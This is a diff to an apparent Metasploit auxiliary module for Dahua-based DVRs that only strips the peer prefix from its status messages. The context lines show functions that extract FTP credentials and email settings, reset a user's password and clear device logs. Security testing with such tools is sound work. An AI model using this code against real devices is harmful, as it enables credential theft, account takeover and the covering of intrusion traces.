@@ -92,7 +92,7 @@ class MetasploitModule < Msf::Auxiliary
     return unless data =~ /[\x00]{8,}([[:print:]]+)/
 
     ver = Regexp.last_match[1]
-    print_good("#{peer} -- version: #{ver}")
+    print_good("- version: #{ver}")
   end
 
   def grab_serial
@@ -102,7 +102,7 @@ class MetasploitModule < Msf::Auxiliary
     return unless data =~ /[\x00]{8,}([[:print:]]+)/
 
     serial = Regexp.last_match[1]
-    print_good("#{peer} -- serial number: #{serial}")
+    print_good("- serial number: #{serial}")
   end
 
   def grab_email
@@ -111,13 +111,13 @@ class MetasploitModule < Msf::Auxiliary
     return unless (response = sock.get_once)
 
     data = response.split('&&')
-    print_good("#{peer} -- Email Settings:")
+    print_good("- Email Settings:")
     return unless data.first =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?(?:\.[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?)*\.?+:\d+)/i
 
     if mailhost = Regexp.last_match[1].split(':')
-      print_status("#{peer} --  Server: #{mailhost[0]}") unless mailhost[0].blank?
-      print_status("#{peer} --  Server Port: #{mailhost[1]}") unless mailhost[1].blank?
-      print_status("#{peer} --  Destination Email: #{data[1]}") unless data[1].blank?
+      print_status("-  Server: #{mailhost[0]}") unless mailhost[0].blank?
+      print_status("-  Server Port: #{mailhost[1]}") unless mailhost[1].blank?
+      print_status("-  Destination Email: #{data[1]}") unless data[1].blank?
       mailserver = "#{mailhost[0]}"
       mailport = "#{mailhost[1]}"
       muser = "#{data[5]}"
@@ -168,7 +168,7 @@ class MetasploitModule < Msf::Auxiliary
     sock.put(NAS)
     return unless (data = sock.get_once)
 
-    print_good("#{peer} -- NAS Settings:")
+    print_good("- NAS Settings:")
     server = ''
     port = ''
     if data =~ /[\x00]{8,}[\x01][\x00]{3,3}([\x0-9a-f]{4,4})([\x0-9a-f]{2,2})/
@@ -179,10 +179,10 @@ class MetasploitModule < Msf::Auxiliary
       ftpuser.strip!
       ftppass.strip!
       unless ftpuser.blank? || ftppass.blank?
-        print_good("#{peer} --  NAS Server: #{server}")
-        print_good("#{peer} --  NAS Port: #{port}")
-        print_good("#{peer} -- FTP User: #{ftpuser}")
-        print_good("#{peer} -- FTP Pass: #{ftppass}")
+        print_good("-  NAS Server: #{server}")
+        print_good("-  NAS Port: #{port}")
+        print_good("- FTP User: #{ftpuser}")
+        print_good("- FTP Pass: #{ftppass}")
         report_creds(
           host: server,
           port: port,
@@ -282,14 +282,14 @@ class MetasploitModule < Msf::Auxiliary
     sock.put(u1)
     return unless sock.get_once
 
-    print_good("#{peer} -- user #{datastore['USERNAME']}'s password reset to #{@password}")
+    print_good("- user #{datastore['USERNAME']}'s password reset to #{@password}")
   end
 
   def clear_logs
     connect
     sock.put(CLEAR_LOGS1)
     sock.put(CLEAR_LOGS2)
-    print_good("#{peer} -- logs cleared")
+    print_good("- logs cleared")
   end
 
   def peer
@@ -304,7 +304,7 @@ class MetasploitModule < Msf::Auxiliary
       disconnect
       return unless data == DVR_RESP
 
-      print_good("#{peer} -- Dahua-based DVR found")
+      print_good("- Dahua-based DVR found")
       report_service(host: rhost, port: rport, sname: 'dvr', info: "Dahua-based DVR")
 
       case action.name.upcase
